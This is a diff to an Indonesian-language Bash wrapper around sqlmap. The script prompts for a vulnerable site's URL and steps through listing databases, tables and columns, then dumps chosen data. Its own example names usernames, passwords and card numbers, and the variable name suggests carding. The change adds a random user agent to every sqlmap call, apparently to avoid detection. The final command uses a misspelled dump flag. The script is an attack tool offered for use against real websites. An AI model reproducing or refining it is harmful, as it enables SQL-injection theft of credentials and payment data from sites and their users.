@@ -46,7 +46,7 @@ cd sqlmap
 clear
 read -p "Masukkan Link atau Web Yang Error (VULN): " cardinger
 clear
-./sqlmap.py -u $cardinger --dbs
+./sqlmap.py -u $cardinger --random-agent --dbs
                 echo ""
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
@@ -66,7 +66,7 @@ done
 echo ""
 read -p "Ketikkan Table Yang Akan Di Buka: " tabled
 clear
-./sqlmap.py -u $cardinger -D $tabled --tables
+./sqlmap.py -u $cardinger --random-agent -D $tabled --tables
 echo ""
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
@@ -85,7 +85,7 @@ do
 done
 read -p "Ketikkan Column Yang Akan Di Buka: " columed
 clear
-./sqlmap.py -u $cardinger -D $tabled -T $columed --columns
+./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed --columns
 echo ""
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
@@ -105,5 +105,5 @@ done
 echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
 read -p "Ketikkan Nama Data Yang Mau Di Ambil: " dataed
 clear
-./sqlmap.py -u $cardinger -D $tabled -T $columed -C $dataed --dumps
+./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed -C $dataed --dumps
 echo "SEKIAN SEMOGA SUKSES BOSS!!!"
